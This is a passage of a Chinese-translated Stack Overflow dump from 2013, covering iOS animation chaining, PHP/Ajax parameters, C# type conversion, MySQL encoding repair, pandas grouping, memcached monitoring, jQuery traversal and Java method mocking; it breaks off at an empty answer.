 label1.frame = CGRectMake(xBoard, 5, textWidth, term1Label.frame.size.height);
    xBoard = xBoard + textWidth;
    label1.textColor = term1Label.textColor;
    label1.font = [UIFont italicSystemFontOfSize:textHeight];
    label1.textAlignment = term1Label.textAlignment;
    label1.text = label1String;
    label1.alpha = 0;
    label1.backgroundColor = [UIColor clearColor];
    [boardView addSubview:label1];

    [UIView animateWithDuration:2.0*time
                          delay:timeDelay
                        options:UIViewAnimationOptionCurveEaseInOut
                     animations:^{
                           label1.alpha = 1;
                   } completion:^(BOOL finished){
                             }
                 ];

    timeDelay = timeDelay + 2.0*time; 
```

一些标签出现，一些消失，一些改变颜色。一切正常，直到我进行第二次循环。然后代码的第一部分刚刚出现（改变颜色的动画仍在工作，但第一个循环的所有标签都是可见的并且没有动画。第二个循环动画很好。

我试图用 CABasicAnimations 替换动画 [UIView animateWithDuration:...] 并将它们保存在一个带有队列的 NSMutableArray 中，但我没有成功。可能我的知识还太少。欢迎任何帮助。谢谢！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T21:31:35.527

我正在解决我的问题。做我的循环我将动画参数保存在表中

```
 NSArray *animation1 = [[NSArray alloc]initWithObjects:[NSNumber       numberWithInt:label1.tag], [NSNumber numberWithInt:3],[NSNumber numberWithFloat:0.5f*time],[NSNumber numberWithFloat:timeDelay],[NSNumber numberWithFloat:0],nil];
                [animations addObject:animation1]; 
```

在 void 结尾我调用 [self performAnimations];

```
 - (void)performAnimations {
if ([[self animations] count] == 0) return;

for (int i=0; i<[[self animations] count]; i++) {

    int tag = [[[animations objectAtIndex:i]objectAtIndex:0]intValue];
    int animation = [[[animations objectAtIndex:i]objectAtIndex:1]intValue];
    float animTime = [[[animations objectAtIndex:i]objectAtIndex:2]floatValue];
    float animDelay = [[[animations objectAtIndex:i]objectAtIndex:3]floatValue];
    float parameter = [[[animations objectAtIndex:i]objectAtIndex:4]floatValue];

    UILabel *label = [UILabel alloc];
    UIView *view = [UIView alloc];
    if ([[self.view viewWithTag:tag] isKindOfClass:[UILabel class]]){
        label = (UILabel *)[self.view viewWithTag:tag];
    } else if ([[self.view viewWithTag:tag] isKindOfClass:[UIView class]]) {
        view = (UIView *)[self.view viewWithTag:tag];
    }

    switch (animation) {
        case 1:
            [PolyCalcsViewController colorizeLabelForAWhile:label withUIColor:[UIColor yellowColor] animated:YES withTime:animTime withDelay:animDelay];
            break;
        case 2:
            [PolyCalcsViewController appear:label withTime:animTime withDelay:animDelay];
            break;
        case 3:
            [PolyCalcsViewController disappear:label withTime:animTime withDelay:animDelay];
            break;
        case 4:
            [PolyCalcsViewController moveView:view withOffset:parameter withTime:animTime withDelay:animDelay];
            break;

        default:
            break;
    }

}

[animations removeAllObjects]; 
```

}

```
 +(void)colorizeLabelForAWhile:(UILabel *)label withUIColor:(UIColor *)tempColor animated:(BOOL)animated withTime:(float)time withDelay:(float)delay{
UILabel *tempLabel = [[UILabel alloc] init];
tempLabel.textColor = tempColor;
tempLabel.font = label.font;
tempLabel.alpha = 0;
tempLabel.textAlignment = label.textAlignment;
tempLabel.text = label.text;
tempLabel.backgroundColor = [UIColor clearColor];
[label.superview addSubview:tempLabel];
tempLabel.frame = label.frame;

    if (animated) {
        [UIView animateWithDuration:time
                              delay:delay
                            options:UIViewAnimationOptionCurveEaseInOut
                         animations:^{
                             // Animate it
                             label.alpha = 0;
                             tempLabel.alpha = 1;
                         } completion:^(BOOL finished){
                             [UIView animateWithDuration:time
                                                   delay:0
                                                 options:UIViewAnimationOptionCurveEaseInOut
                                              animations:^{
                                                  // Animate it back.
                                                  label.alpha = 1;
                                                  tempLabel.alpha = 0;
                                              } completion:^(BOOL finished){
                                                // Remove the tempLabel view when we are done.
                                                  [tempLabel removeFromSuperview];
                                              }];
                         }];

    } else {
        // Change it back at once and remove the tempLabel view.
        label.alpha = 1.0;
        [tempLabel removeFromSuperview];
    } 
```

}

```
 +(void)appear:(UILabel *)label withTime:(float)time withDelay:(float)delay{
    [UIView animateWithDuration:time
                          delay:delay
                        options:UIViewAnimationOptionCurveEaseInOut
                     animations:^{
                         label.alpha = 1.0;
                     } completion:^(BOOL finished){
                         NSLog(@"Anim Appear %d",label.tag);
                     }];        
     }

    +(void)disappear:(UILabel *)label withTime:(float)time withDelay:(float)delay{
[UIView animateWithDuration:time
                      delay:delay
                    options:UIViewAnimationOptionCurveEaseInOut
                 animations:^{
                     label.alpha = 0.0;
                 } completion:^(BOOL finished){
                     NSLog(@"Anim Disappear %d",label.tag);
                     [label removeFromSuperview];
                 }];    
        } 
```

关键是程序没有按照表格动画中的顺序执行动画。我想我应该放弃时间延迟，在上一个动画完成后运行下一个动画。我可以在 completion:(BOOL finished) 块中创建一个计数器，但我不知道如何，因为该函数不接受外部变量。任何想法如何检测动画结束并控制表格执行？谢谢。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-22T13:48:11.790

最后我解决了这个问题。这是一个正确工作的代码

```
 - (void)performAnimations {
// Finish when there are no more animations to run

int i = animationNumber;
int tag = [[[animations objectAtIndex:i]objectAtIndex:0]intValue];
int animation = [[[animations objectAtIndex:i]objectAtIndex:1]intValue];
float animTime = [[[animations objectAtIndex:i]objectAtIndex:2]floatValue];
//float animDelay = [[[animations objectAtIndex:i]objectAtIndex:3]floatValue];
float animDelay = 0;
float parameter = [[[animations objectAtIndex:i]objectAtIndex:4]floatValue];

UILabel *label = [UILabel alloc];
UIView *view = [UIView alloc];
if ([[self.view viewWithTag:tag] isKindOfClass:[UILabel class]]){
    label = (UILabel *)[self.view viewWithTag:tag];
} else if ([[self.view viewWithTag:tag] isKindOfClass:[UIView class]]) {
    view = (UIView *)[self.view viewWithTag:tag];
}

switch (animation) {
    case 1:
        [self colorizeLabelForAWhile:label withUIColor:[UIColor yellowColor] animated:YES withTime:animTime withDelay:animDelay];
        break;
    case 2:
        [self appear:label withTime:animTime withDelay:animDelay];
        break;
    case 3:
        [self disappear:label withTime:animTime withDelay:animDelay];
        break;
    case 4:
        [self moveView:view withOffset:parameter withTime:animTime withDelay:animDelay];
        break;

    default:
        break;
}
}

 -(void)animationDidFinished{
animationNumber = animationNumber + 1;
if (animationNumber == [[self animations] count]) {
    [animations removeAllObjects];
    return;
} else {
    [self performAnimations];
}
}

-(void)colorizeLabelForAWhile:(UILabel *)label withUIColor:(UIColor *)tempColor animated:(BOOL)animated withTime:(float)time withDelay:(float)delay{
UILabel *tempLabel = [[UILabel alloc] init];
tempLabel.textColor = tempColor;
tempLabel.font = label.font;
tempLabel.alpha = 0;
tempLabel.textAlignment = label.textAlignment;
tempLabel.text = label.text;
tempLabel.backgroundColor = [UIColor clearColor];
[label.superview addSubview:tempLabel];
tempLabel.frame = label.frame;

    if (animated) {
        [UIView animateWithDuration:time
                              delay:delay
                            options:UIViewAnimationOptionCurveEaseInOut
                         animations:^{
                             // Animate it
                             label.alpha = 0;
                             tempLabel.alpha = 1;
                         } completion:^(BOOL finished){
                             [UIView animateWithDuration:time
                                                   delay:0
                                                 options:UIViewAnimationOptionCurveEaseInOut
                                              animations:^{
                                                  // Animate it back.
                                                  label.alpha = 1;
                                                  tempLabel.alpha = 0;
                                              } completion:^(BOOL finished){
                                                // Remove the tempLabel view when we are done.
                                                  [tempLabel removeFromSuperview];
                                                  if (finished) {
                                                      [self animationDidFinished];
                                                  }

                                              }];
                         }];

    } else {
        // Change it back at once and remove the tempLabel view.
        label.alpha = 1.0;
        [tempLabel removeFromSuperview];
    }
}

-(void)appear:(UILabel *)label withTime:(float)time withDelay:(float)delay{
    [UIView animateWithDuration:time
                          delay:delay
                        options:UIViewAnimationOptionCurveEaseInOut
                     animations:^{
                         label.alpha = 1.0;
                     } completion:^(BOOL finished){
                         NSLog(@"Anim Appear %d",label.tag);
                         if (finished) {
                             [self animationDidFinished];
                         }
                     }];

 }

 -(void)disappear:(UILabel *)label withTime:(float)time withDelay:(float)delay{
[UIView animateWithDuration:time
                      delay:delay
                    options:UIViewAnimationOptionCurveEaseInOut
                 animations:^{
                     label.alpha = 0.0;
                 } completion:^(BOOL finished){
                     NSLog(@"Anim Disappear %d",label.tag);
                     [label removeFromSuperview];
                     if (finished) {
                         [self animationDidFinished];
                     }

                 }];

 }

 -(void)moveView:(UIView *)view withOffset:(float)offset withTime:(float)time withDelay:(float)delay{
[UIView animateWithDuration:time
                      delay:delay
                    options:UIViewAnimationOptionCurveEaseInOut
                 animations:^{
                     CGRect frame = view.frame;
                     frame.origin.y += offset;
                     view.frame = frame;
               } completion:^(BOOL finished){
                   if (finished) {
                       [self animationDidFinished];
                   }
               }
 ];
 } 
```

# node.js - 我们可以使用 Node.js 编写多线程行为吗？

> ID：16110131
> 
> 赞同：0
> 
> 时间：2013-04-19T17:18:01.863
> 
> 标签：node.js, multithreading

我想编写一个程序来模拟来自一组传感器的数据。所以我需要一些机制，通过它我可以产生几千个线程，这些线程将同时向数据库发送数据（所有线程的时间戳必须相同），然后休眠一段时间，然后再次发送一些数据。

由于产生数千个线程效率不高，而且它可能会导致系统崩溃，我认为`Node.js`它更适合这种要求。如果我错了，请纠正我。

我们可以使用 Node.js 的回调函数来做这样的事情吗？或者是否有任何其他可以生成随机时间序列数据的开源 api/工具？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:20:03.720

JavaScript 是单线程的，这包括 Node.js。但是，您可以通过运行多个 Node 进程来模拟这一点。

要在进程之间进行通信，您可以使用来自以下位置的 0MQ 节点绑定：[https ://github.com/JustinTulloss/zeromq.node](https://github.com/JustinTulloss/zeromq.node)

# php - 传递由 Js 函数产生的变量（到 Ajax），但 PHP 将其作为“NULL”

> ID：16110132
> 
> 赞同：1
> 
> 时间：2013-04-19T17:18:11.610
> 
> 标签：php, javascript

此函数通过将 iput 字符串与 PHP 从数据库中获取的数据进行比较来正确检查 iput 字符串是否已被使用。我的问题是，当我通过 Ajax 传递这个变量时，它返回“NULL”，但是当我传递其他变量时，它们被正确发送，所以 ajax 函数正在工作。也许我的职能中的某些事情是罪魁祸首？

```
var string, code, codUp, result;
function check(){
      string="<?php echo $html; ?>";
      code = document.getElementById('this_code').value;
      codUp = code.toUpperCase();
      result=string.split(" ");      

if (document.getElementById('this_code').value === "")
{
    return false;
}
else if (result.indexOf(codUp) === -1)
{
    return false;
}
else{alert ('Code already in use.');}
}; 
```

AJAX

```
ajax.open('GET','agencies/gen_ag.php?action=add&name='+name+'codeUp='+codUp+'&nocomp='+nocompt_ag,true); 
```

PHP

```
if($_GET['action']=='add')  {
$res_seecode = mysql_query("SELECT * FROM agencies WHERE EMP_CODE = '$_GET[code]'");
if(!mysql_num_rows($res_seecode))   {
    $res_add = mysql_query("INSERT INTO agencies VALUES      ('NULL','$_GET[codUp]','$_GET[name]'");

            echo 'Agencie created.';
} 
```

`Var_dump();`返回名称但不返回 codUp。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:19:34.130

查看查询字符串：

```
?action=add&name='+name+'codeUp='+codUp'&nocomp='+nocompt_ag 
```

**关键**是：

*   动作（**值为**“添加”）
*   名称（**值**是`name`变量的值）
*   codeUp（**值**是`codUp`变量的值）
*   nocomp（**值**是`nocompat_ag`变量的值）

要获取发送到服务器的**值**，请使用带有,和的**键**。`$_GET``$_POST``$_REQUEST`

您应该使用`$_GET["codeUp"]`，因为您在查询字符串中使用的键是“codeUp”。`codUp`只是保存发送到服务器的“codeUp”键值的 Javascript 变量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:24:07.183

除了确保变量名称匹配（您仍然`code`在一个查询中引用）之外，您还应该对您的值进行 URL 编码...#

```
ajax.open('GET','agencies/gen_ag.php?action=add&name='+encodeURIComponent(name)+'codeUp='+encodeURIComponent(codUp)'&nocomp='+encodeURIComponent(nocompt_ag),true); 
```

注意使用`encodeURIComponent()`- 否则如果你的名字包含非 url 安全的字符，比如`?`or `&`，它会破坏事情

# opengl - Qt 5.0.1 + Visual Studio 2012 + OpenGL

> ID：16110134
> 
> 赞同：3
> 
> 时间：2013-04-19T17:18:16.467
> 
> 标签：opengl, visual-studio-2012, qt5

我正在尝试将我的 Qt4 项目转换为 Qt5。它使用 OpenGL 并且在 2008/Qt4.8.4 上运行良好。请注意，我正在重新输入列出的错误，而不是复制粘贴。

*   我已经使用“-opengl desktop”标志重新编译了 Qt 5.0.1（成功）
*   安装了 Visual Studio 2012 插件

当我编译我的代码时，我收到以下错误：

```
1>C:\Program Files (x86)\Windows Kits\8.0\Include\um\GL/gl.h(60): error C2371:
  'GLdouble' : redefinition; different basic types
1>  c:\qt\qt-everywhere-opensource-src-
             5.0.1\qtbase\include\qtgui\../../src/gui/opengl/qopengl.h(71) 
   : see declaration of 'GLdouble' 
```

如果我`#include <GL/gl.h>`用`#include <qopengl.h>`我得到

> 未找到 GL_PROJECTION 宏

错误等等。由于 -opengl 桌面标志，我“不应该”使用 OpenGL ES。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-06T21:03:13.063

Qt 5.0.1 不支持（甚至重新编译）桌面 OpenGL。使用 Qt 5.0.2 或更高版本进行了重建。

# c# - 如何能够在 C# 中使用 ToInt 方法？

> ID：16110140
> 
> 赞同：0
> 
> 时间：2013-04-19T17:18:41.057
> 
> 标签：c#

我有这段代码

```
Int32 clientiid = row["CodCliente "].ToInt(); 
```

但这被标记为错误提示并且您缺少指令或参考 我应该添加什么才能使 ToInt 工作？我已经使用了这个参考。先感谢您

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using MySql.Data.MySqlClient;
using System.Data;
using System.Data.SqlClient;
using System.Text;
using System.Configuration;

Int32 clientiid = row["CodCliente "].ToInt(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:20:40.470

C#中没有`ToInt()`方法。

如果你`int`在 type 的表达式中有一个装箱的值`object`，你可以简单地转换它：

```
int clientId = (int)row["CodCliente"]; 
```

如果您不确定表达式的运行时类型是什么（例如，它可能是`long`or `decimal`，甚至是 a `string`），您可以调用`Convert.ToInt32()`，它会找出它实际上是什么，然后`int`为您将其转换为 an 。

有关更多信息，请参阅[这篇出色的博客文章](http://blogs.msdn.com/b/ericlippert/archive/2009/03/19/representation-and-identity.aspx)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T17:23:52.430

您也可以使用以下方法，

```
Convert.ToInt32(row["CodCliente"]); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-19T17:22:20.493

C# 编译器告诉您它无法识别`.ToInt()`方法。所以它应该被声明或使用这种方法的程序集应该在文档的标题中引用。

你可以写这样的东西（基于行数据返回类型的扩展方法）；if`row["index"]`返回字符串，例如：

```
public static int ToInt(this string number)
{
    return int.Parse(number);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-19T17:20:50.067

你调用的方法是错误的。你需要做（假设值是一个字符串）`Convert.ToInt32(row["CodCliente "])`

`(int)row["CodCliente "]`你也可以像我喜欢的那样投射。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-19T17:21:17.043

没有`Object.ToInt()`方法。您需要使用：

```
Convert.ToInt32(row["CodCliente "]); 
```

或者

```
int.Parse(row["CodCliente "]); 
```

或者，如果该值已经是行中的 int，您可以简单地转换：

```
(int)row["CodeCliente "]; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-19T17:21:55.397

像这样使用转换：

```
int clientId = Convert.ToInt32(row["CodCliente"]); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-04-19T17:26:41.490

什么日期类型是`row`？`row[string index]`索引器返回什么数据类型？该类型有`ToInt()`方法吗？该类型是否有`ToInt()`可用的扩展方法？

类或结构是否可转换为 int（例如，是否`row["foo"] is int`返回 true？如果是这样，您可以简单地转换它，因此：`int x = (int) row["foo"]`.

如果 object 是字符串，则可以使用`int.Parse()`or `int.TryParse()`。

# mysql - 转换 MySQL 返回的编码错误的字符串

> ID：16110141
> 
> 赞同：1
> 
> 时间：2013-04-19T17:18:45.257
> 
> 标签：mysql, ruby, mysql2

从 ruby​​1.8/mysql gem 迁移到 ruby​​1.9/mysql2 后，我从遗留数据库中得到了被报告为 utf8 的字符串，但看起来像是用 latin1 编码的（或者，可能有某种双重编码，就像直接 force_encoding 一样没有帮助）。

字符串示例：

```
Ñ„Ñ‹Ð²Ð°Ð¿Ñ€Ð¾Ð»Ð´Ð¶Ñ - just a test string - Ð¹Ñ†ÑƒÐºÐµÐ½Ð³ÑˆÑ‰Ð·Ñ…ÑŠ 
```

我希望能够将其转换为

```
фывапролджэ - just a test string - йцукенгшщзхъ 
```

有人可以帮助转换 a) 使用 ruby​​ 代码和/或 b) 使用 SQL 吗？

由于复制粘贴可能会丢失一些信息，因此返回字符串中的字节： [195, 145, 226, 128, 158, 195, 145, 226, 128, 185, 195, 144, 194, 178, 195, 144, 194, 176, 195, 144, 194, 191, 195, 145, 226, 130, 172, 195, 144, 194, 190, 195, 144, 194, 187, 195, 144, 194, 180, 195, 144, 194, 182, 195, 145, 194, 141, 32, 45, 32, 106, 117, 115, 116, 32, 97, 32, 116, 101, 115, 116, 32, 115, 116, 114, 105, 110, 103、32、45、32、195、144、194、185、195、145、226、128、160、195、145、198、146、195、144、194、186、195、144、194、181、 195, 144, 194, 189, 195, 144, 194, 179, 195, 145, 203, 134, 195, 145, 226, 128, 176, 195, 144, 194, 183, 195, 145, 226, 128, 166、195、145、197、160]

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:59:41.363

好的，我在[How to fix double-encoded UTF8 characters (in an utf-8 table) 中](https://stackoverflow.com/questions/11436594/how-to-fix-double-encoded-utf8-characters-in-an-utf-8-table)找到了一个 SQL 解决方案。

```
CONVERT(CAST(CONVERT(field USING latin1) AS BINARY) USING utf8) 
```

有 Ruby 的接受者吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:21:58.940

您可能希望将数据库连接的编码设置为`config/database.yml`，尝试不同的设置，直到获得所需的结果。

可能是您的连接`latin1`由于某种原因默认为，但在内部被重新解释为 UTF8。

# python - 在一个级别分组和排序，在另一个级别显示计数

> ID：16110142
> 
> 赞同：1
> 
> 时间：2013-04-19T17:18:52.317
> 
> 标签：python, pandas

对于下面的示例

```
import pandas as pd
data = {'state': ['Ohio', 'Ohio', 'Ohio', 'Ohio', 'Ohio',
                  'Nevada', 'Nevada','Nevada','Nevada'],
        'year': [2000, 2000, 2000, 2002, 2002,
                 2002, 2002, 2002, 2002],
        'pop': [1, 1, 1, 1, 1, 1, 1, 1, 1]}
df = pd.DataFrame(data) 
```

输出

```
 pop   state  year
0    1    Ohio  2000
1    1    Ohio  2000
2    1    Ohio  2000
3    1    Ohio  2002
4    1    Ohio  2002
5    1  Nevada  2002
6    1  Nevada  2002
7    1  Nevada  2002
8    1  Nevada  2002 
```

对于每个州+年份组合，我需要pop总和，*但是*，排序需要基于州级别。

所以我需要计数中的计数，并在第一级完成排序。输出就像

```
 state  year  sum
   Ohio  2000  3
         2002  2
   Nev.  2002  4 
```

如您所见，俄亥俄州位居榜首，因为总和为 5，其总组有更多项目。

展示是关键，我只想展示一次俄亥俄州。

我相信我需要在 Pandas 上使用分层索引，但是我无法弄清楚确切的语法。stack / unstack 在这里有用吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-19T18:49:59.347

`stack()`并且`unstack()` *可以*提供帮助，是的，另外`reindex()`：

```
In [11]: res = df.groupby(['state', 'year']).sum()

In [12]: res
Out[12]: 
             pop
state  year     
Nevada 2001    1
       2002    3
Ohio   2000    3
       2002    2

In [13]: st = np.sort(df.groupby('state')['pop'].sum())[::-1]

In [14]: st
Out[14]: 
state
Ohio      5
Nevada    4
Name: pop

In [15]: res.unstack().reindex(st.index).stack()
Out[15]: 
             pop
state  year     
Ohio   2000    3
       2002    2
Nevada 2001    1
       2002    3 
```

虽然我不确定这是否是最优雅的解决方案。我会让`pandas`功夫大师在这里说出他们的智慧之言。

# memcached - 有哪些有用的提示/工具可用于监控/调整 memcached 运行状况？

> ID：16110143
> 
> 赞同：12
> 
> 时间：2013-04-19T17:19:01.713
> 
> 标签：memcached

昨天，我发现了这个很酷的脚本“ [memcache-top](https://code.google.com/p/memcache-top/) ”，它可以很好地打印出 memcached 的实时统计信息。看起来像，

```
memcache-top v0.6       (default port: 11211, color: on, refresh: 3 seconds)

INSTANCE                USAGE   HIT %   CONN    TIME    EVICT/s READ/s  WRITE/s
127.0.0.1:11211         88.8%   94.8%   20      0.8ms   9.0     311.3K  162.8K

AVERAGE:                88.8%   94.8%   20      0.8ms   9.0     311.3K  162.8K

TOTAL:          1.8GB/  2.0GB           20      0.8ms   9.0     311.3K  162.8K
(ctrl-c to quit.) 
```

当您应该注意某事时，它甚至会使某些文本变红！

问：概括地说，您使用了哪些有用的工具/技术来检查 memcached 是否设置良好？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-04-23T00:33:18.020

访问 Memcached 服务器实例的良好接口是[phpMemCacheAdmin](https://code.google.com/p/phpmemcacheadmin/)。

我更喜欢使用`telnet`.

要使用 Telnet 连接到 Memcached，请从命令行使用以下`telnet localhost 11211`命令。

如果您想随时终止 Telnet 会话，只需键入`quit`并按回车键。

您可以通过在`stats`连接后运行命令来了解 Memcached 服务器的重要统计信息。

内存在内部以块的形式分配并不断重复使用。由于内存被分成不同大小的板块，如果你的项目不能完全适合服务器选择放入的板块，你就会浪费内存。

因此，Memcached 会根据您的数据大小自动将您的数据分配到不同的内存“平板”（将这些视为分区），这反过来又使内存分配更加优化。

要列出您连接到的实例中的平板，请使用该`stats slab`命令。

一个更有用的命令是`stats items`，它将为您提供一个平板列表，其中包括每个平板中存储的项目的计数。

现在您知道如何列出平板，您可以使用`stats cachedump [slab ID] [number of items, 0 for all items]`命令浏览每个平板以列出其中包含的项目。

如果要获取该项目的实际值，可以使用`get [key]`命令。

要从缓存中删除项目，您可以使用该`delete [key]`命令。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-07-09T14:35:50.883

[对于生产系统，您应该使用Monit](http://mmonit.com/monit/ "监控")之类的东西真正设置 Memcache 的主动监控（包括停机警报、自动重启等）。这是一个示例配置：[使用 Monit 监控 Memcache](http://www.alphadevx.com/a/392-Monitoring-Memcache-with-Monit "使用 Monit 监控 Memcache")

# javascript - 单击一个后选择接下来的两个元素。（jQuery）

> ID：16110146
> 
> 赞同：1
> 
> 时间：2013-04-19T17:19:10.887
> 
> 标签：javascript, jquery, traversal

我有一张这样的桌子：

```
<table>
<tbody>
<tr class='clickme'>
<td>...</td>
</tr>
<tr class='hidden1'>
<td>...</td>
</tr>
<tr class='hidden2'>
<td>...</td>
</tr>
<tr class='clickme'>
<td>...</td>
</tr>
<tr class='hidden1'>
<td>...</td>
</tr>
<tr class='hidden2'>
<td>...</td>
</tr>
[etc.]
</tbody>
</table> 
```

.hidden1 和 .hidden2 是 display: none。我的目标是单击 clickme 并显示接下来的两个，但仅显示这两个，并且仅显示我单击的 clickme“下方”的那些。

我试过最接近：

```
$('.clickme').click(function (e) {
    $(this).closest('.hidden1').remove();
    $(this).closest('.hidden2').remove();
}); 
```

没有反应。多种不同的东西。我尝试了中等成功的兄弟姐妹，但它只显示了整个表中的第一个匹配项。该表可能有 100 个这样的对。

```
$('.clickme').click(function (e) {
        $(this).siblings(".hidden1:first").toggle(); 
        $(this).siblings(".hidden2:first").toggle(); 
    }); 
```

我被难住了，我觉得这是一个简单的解决方案！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:21:27.250

对于您的标记，它很容易使用`.nextUntil()`：

```
$(".clickme").click(function() {
    $(this).nextUntil(".clickme").toggle();
}); 
```

**演示：http:** [//jsfiddle.net/XEF2v/](http://jsfiddle.net/XEF2v/)

如果中间可能有其他行，您可以使用以下方式过滤它们`.filter()`：

```
$(this).nextUntil(".clickme").filter(".hidden1, .hidden2").toggle(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:23:25.077

如果您在以下之前有其他不想选择的元素，`".clickme"`因此无法使用 VisioN 的解决方案，您可以：

```
$('.clickme').click(function (e) {
    $(this).nextAll(".hide1").eq(0).toggle(); 
    $(this).nextAll(".hide2").eq(0).toggle(); 
}); 
```

# web-applications - 网页设计 - 水平滚动与否？

> ID：16110147
> 
> 赞同：1
> 
> 时间：2013-04-19T17:19:11.950
> 
> 标签：web-applications, user-interface, ui-design

我正在开发我的第一个基于 Web（基于浏览器）的应用程序，它有许多数据输入表单和显示表单。其中许多表格显示了相当多的数据。我最初创建的大部分表单都包含多列数据以避免垂直滚动，并且我尽量避免水平滚动。但是，我真的不关心我创建的表单的外观和感觉。

当我查看过许多基于 Web 的应用程序时，我注意到大多数应用程序设计得相当狭窄，可能只占用浏览器中水平空间的 50% 到 60%，并尽可能多地垂直滚动以显示所有数据。

问题：这样做是为了同时支持移动设备和桌面/笔记本电脑浏览器吗？这似乎是在浪费屏幕空间，但如果意图是支持移动设备以及台式机/笔记本电脑，这是有道理的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-05T12:17:17.533

明显不是。但您可以为您的应用程序创建响应式布局。它将为您的访问者提供最佳的观看体验。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:22:29.080

大多数网站这样做是为了避免在较小的屏幕上水平滚动（网络失礼）。一个流行的设计趋势（至少，我上次看到的）是 960 像素宽的设计，以便很好地适应 1024 像素宽的屏幕。对于在较大屏幕上较窄的固定宽度设计，一个更好的解决方案是使用响应式/响应式设计来充分利用可用的屏幕空间。

有关响应式设计教程，请查看[http://www.smashingmagazine.com/responsive-web-design-guidelines-tutorials](http://www.smashingmagazine.com/responsive-web-design-guidelines-tutorials)。当您开始使用它时非常简单，您可以使用`@media`查询根据视口的大小将不同的规则应用于元素。

# java - 是否可以在已经存在的对象中模拟单个方法？

> ID：16110148
> 
> 赞同：3
> 
> 时间：2013-04-19T17:19:11.993
> 
> 标签：java, easymock, powermock, white-box

对于集成测试，我需要模拟 Java 服务客户端中的特定方法，而不会破坏其中的其余信息。它没有自构造函数，所以这样的解决方案是不可能的：

```
private DBClient mockClient = new DBClient(alreadyExistingClient){
    @Override
    void deleteItem(Item i){
        //my stuff goes here
    }
}; 
```

有没有办法模拟 deleteItem 方法，以便将凭据、端点等保存在现有的 DBClient 对象中？

编辑：在这种情况下，mockito 不可用

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-19T20:43:50.160

您可以使用动态代理来拦截您想要的任何方法调用，因此您可以决定是调用真实方法还是做任何您想做的事情。

这是一个如何拦截方法的例子`Set.add()`，你可以对`deleteItem()`

```
package example.dynamicproxy;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Set;

public class SetProxyFactory {

    public static Set<?> getSetProxy(final Set<?> s) {
        final ClassLoader classLoader = s.getClass().getClassLoader();
        final Class<?>[] interfaces = new Class[] {Set.class};
        final InvocationHandler invocationHandler = new InvocationHandler() {

            @Override
            public Object invoke(final Object proxy, final Method method, final Object[] args) throws Throwable {

                if (method.getName().equals("add")) {
                    System.out.println("add() intercepted");
                    // do/return whatever you want
                }

                // or invoke the real method
                return method.invoke(s, args);
            }
        };

        final Object proxy = Proxy.newProxyInstance(classLoader, interfaces, invocationHandler);

        return (Set<?>) proxy;
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T18:11:38.563

您可以去低保真并创建 DBClient 类的子类。向该子类传递您要模拟的 DBClient 实例。

在子类中使用组合，并将所有方法调用委托给原始 DBClient，除了您要模拟的方法调用。将您的模拟实现添加到您想要的方法中。

这不像模拟框架那样可重用，但应该可以工作。

```
DBClient mockDbClient = new DBClient() {
     private DBClient dbClientDelegate;

     public void setDelegate(DBClient dbClient) {
         dbClientDelegate = dbClient;
    }

    //override all methods. 
    //delegate to the corresponding method of the dbClientDelegate instance

    //overide the method you want to mock, add asserts for method arguments
    //return mock data as appropriate

}

mockDbClient.setDelegate(preinstantiatedDbClient);
//inject mockDbClient to test class
//call test class / method 
```

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-06-13T13:52:53.273

在 Mockito 2+ 中，您可以为此目的使用间谍功能：

```
 PrintStream realSystemOut = System.out;
    realSystemOut.println("XXX");

    PrintStream mockedSystemOut = Mockito.spy(realSystemOut);
    Mockito.doNothing().when(mockedSystemOut).println(Mockito.anyString());
    mockedSystemOut.println("YYY"); 
```

输出：

```
XXX 
```

# python - 在 Python 3 中用多个重复值交换字典中的值的键

> ID：16110151
> 
> 赞同：1
> 
> 时间：2013-04-19T17:19:29.387
> 
> 标签：python, dictionary, set

我知道如何交换字典中的键和值，但我不知道如果我想将一个集合作为与该值对应的多个键的值，我应该怎么做。

我有以下代码：

```
def bind(dict1):
dict2 = {}
for k, v in dict1.items():
    dict2[v] = {k}
return dict2 
```

问题是，如果我输入例如

```
bind({'Europa': 'Jupiter', 'Psamathe': 'Neptune', 'Cordelia': 'Uranus', 'Cupid': 'Uranus'}) 
```

它将返回以下内容：

```
{'Jupiter': {'Europa'}, 'Neptune': {'Psamathe'}, 'Uranus': {'Cupid'}} 
```

虽然我需要：

```
{'Jupiter': {'Europa'}, 'Neptune': {'Psamathe'}, 'Uranus': {'Cupid', 'Cordelia'}} 
```

我试图通过输入以下内容将空集作为新字典的值：

```
def bind(dict1):
dict2 = {}
for k, v in dict1.items():
    dict2[v] = {}
return dict2 
```

但是如何将值添加到属于 key 的相应集合中`dict2[v]`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:23:40.287

